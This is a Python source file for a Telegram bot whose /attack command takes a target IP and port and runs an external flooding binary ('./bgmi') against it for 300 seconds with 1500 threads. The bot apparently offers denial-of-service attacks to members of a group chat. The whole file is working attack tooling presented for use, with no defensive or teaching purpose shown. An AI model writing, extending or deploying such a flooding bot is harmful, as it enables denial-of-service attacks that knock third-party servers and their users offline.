import subprocess
import json
import os
import datetime
import asyncio
from telegram import Update, Chat
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
DEFAULT_THREADS = 1500
DEFAULT_PACKET = 9
DEFAULT_DURATION = 300  # Set default duration (e.g., 60 seconds)

users = {}
user_processes = {}  # Dictionary to track processes for each user

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

async def is_group_chat(update: Update) -> bool:
    """Check if the chat is a group or supergroup."""
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def private_chat_warning(update: Update) -> None:
    """Send a warning if the bot is used in a private chat."""
    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    global user_processes
    user_id = str(update.message.from_user.id)

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    if user_id in user_processes and user_processes[user_id].poll() is None:
        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
        return

    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]

    # Start the flooding process for the user
    process = subprocess.Popen(flooding_command)
    user_processes[user_id] = process

    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {DEFAULT_DURATION} seconds with {DEFAULT_THREADS} threads.')

    # Wait for the specified duration asynchronously
    await asyncio.sleep(DEFAULT_DURATION)

    # Terminate the flooding process after the duration
    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {DEFAULT_DURATION} seconds.')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> - Start a flooding attack with default time and threads.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
